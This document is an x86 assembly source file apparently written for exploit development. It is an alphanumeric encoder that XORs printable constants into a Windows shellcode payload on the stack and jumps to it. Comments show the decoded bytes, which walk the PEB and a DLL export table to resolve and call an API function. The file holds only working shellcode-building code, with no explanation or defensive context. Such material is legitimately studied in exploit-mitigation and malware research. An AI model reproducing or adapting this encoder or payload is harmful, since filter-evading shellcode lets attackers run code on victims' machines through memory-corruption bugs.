section .text

global _start
_start:
    pushad
register:
    push 0x21
    pop eax
    xor al , 0x21
    dec eax
    push eax
    xor al, 0x2f
    push eax
    pop esi
    pop ebx
    push esp
    pop ecx
encode:
; push 0x9090585a
    push 0x5c2d233b
    pop eax
    xor eax, 0x33427b61
    push eax
    xor [esp + esi + 0x32], bh
    xor [esp + esi + 0x33], bh
; push 0x585ac361
    push 0x7b3a7551
    pop eax
    xor eax, 0x23604930
    push eax
    xor [esp + esi + 0x31], bh
; push 0xe18b9d61
    push ebx
    pop eax
    xor eax, 0x424d4e5f
    xor eax, 0x5c392c3e
    push eax
    xor [esp + esi + 0x30], bh
; push 0xd2ff500a
    push 0x662e325f
    pop eax
    xor eax, 0x4b2e6255
    push eax
    xor [esp + esi + 0x32], bh
    xor [esp + esi + 0x33], bh
; push 0x6ae08921
    push 0x4d2d4672
    pop eax
    xor eax, 0x27323053
    push eax
    xor [esp + esi + 0x31], bh
    xor [esp + esi + 0x32], bh
; push 0x21212124
    push 0x586a6e7a
    pop eax
    xor eax, 0x794b4f5e
    push eax
; push 0x2c81848d
    push ebx
    pop eax
    xor eax, 0x684e5f4e
    xor eax, 0x4430243c
    push eax
    xor [esp + esi + 0x33], bh
; push 0x82846821
    push 0x4c4f517a
    pop eax
    xor eax, 0x3134395b
    push eax
    xor [esp + esi + 0x32], bh
    xor [esp + esi + 0x33], bh
; push 0x21212124
    push 0x5a7c457d
    pop eax
    xor eax, 0x7b5d6459
    push eax
; push 0x2c812121
    push 0x5c326566
    pop eax
    xor eax, 0x704c4447
    push eax
    xor [esp + esi + 0x32], bh
; push 0x212168da
    push 0x7753355d
    pop eax
    xor eax, 0x56725d78
    push eax
    xor [esp + esi + 0x30], bh
; push 0x0188148b
    push 0x7849263f
    pop eax
    xor eax, 0x793e324b
    push eax
    xor [esp + esi + 0x30], bh
    xor [esp + esi + 0x32], bh
; push 0x4a0c8b66
    push 0x2d5e5723
    pop eax
    xor eax, 0x67522345
    push eax
    xor [esp + esi + 0x31], bh
; push 0x585ae075
    push 0x7a6a4729
    pop eax
    xor eax, 0x2230585c
    push eax
    xor [esp + esi + 0x31], bh
; push 0x3c3e6889
    push 0x4a544b40
    pop eax
    xor eax, 0x766a2336
    push eax
    xor [esp + esi + 0x30], bh
; push 0xfa81f4eb
    push ebx
    pop eax
    xor eax, 0x39475475
    xor eax, 0x3c395f61
    push eax
; push 0xc20111ca
    push 0x55314e6d
    pop eax
    xor eax, 0x68305f58
    push eax
    xor [esp + esi + 0x30], bh
    xor [esp + esi + 0x33], bh
; push 0xc10774c0
    push 0x4470485e
    pop eax
    xor eax, 0x7a773c61
    push eax
    xor [esp + esi + 0x30], bh
    xor [esp + esi + 0x33], bh
; push 0x84acd231
    push ebx
    pop eax
    xor eax, 0x5c765155
    xor eax, 0x27257c64
    push eax
    xor [esp + esi + 0x30], bh
; push 0xc031de01
    push 0x644f494f
    pop eax
    xor eax, 0x5b7e684e
    push eax
    xor [esp + esi + 0x31], bh
    xor [esp + esi + 0x33], bh
; push 0x8f348b49
    push 0x365b3572
    pop eax
    xor eax, 0x466f413b
    push eax
    xor [esp + esi + 0x31], bh
    xor [esp + esi + 0x33], bh
; push 0x4be352da
    push 0x6a4b2944
    pop eax
    xor eax, 0x21577b61
    push eax
    xor [esp + esi + 0x30], bh
    xor [esp + esi + 0x32], bh
; push 0x0124528b
    push 0x545e753e
    pop eax
    xor eax, 0x557a274a
    push eax
    xor [esp + esi + 0x30], bh
; push 0xdf01207a
    push 0x78405541
    pop eax
    xor eax, 0x5841753b
    push eax
    xor [esp + esi + 0x33], bh
; push 0x8b50d801
    push 0x48776c57
    pop eax
    xor eax, 0x3c274b56
    push eax
    xor [esp + esi + 0x31], bh
    xor [esp + esi + 0x33], bh
; push 0x1c428b14
    push 0x41254845
    pop eax
    xor eax, 0x5d673c51
    push eax
    xor [esp + esi + 0x31], bh
; push 0x4a8bda01
    push 0x733e584f
    pop eax
    xor eax, 0x394a7d4e
    push eax
    xor [esp + esi + 0x31], bh
    xor [esp + esi + 0x32], bh
; push 0x781a548b
    push 0x5c766d43
    pop eax
    xor eax, 0x246c3937
    push eax
    xor [esp + esi + 0x30], bh
; push 0x3c538b10
    push 0x523c477d
    pop eax
    xor eax, 0x6e6f336d
    push eax
    xor [esp + esi + 0x31], bh
; push 0x5b8b1b8b
    push 0x6c535b3a
    pop eax
    xor eax, 0x3727404e
    push eax
    xor [esp + esi + 0x30], bh
    xor [esp + esi + 0x32], bh
; push 0x1b8b145b
    push 0x6c3a736b
    pop eax
    xor eax, 0x774e6730
    push eax
    xor [esp + esi + 0x32], bh
; push 0x8b0c5b8b
    push 0x256a225d
    pop eax
    xor eax, 0x51667929
    push eax
    xor [esp + esi + 0x30], bh
    xor [esp + esi + 0x33], bh
; push 0x305b8b64
    push 0x623c5028
    pop eax
    xor eax, 0x5267244c
    push eax
    xor [esp + esi + 0x31], bh
; push 0xdb319c60
    push 0x486a5353
    pop eax
    xor eax, 0x6c5b3033
    push eax
    xor [esp + esi + 0x31], bh
    xor [esp + esi + 0x33], bh
; jmp to shellcode
to_shellcode:
    jmp esp
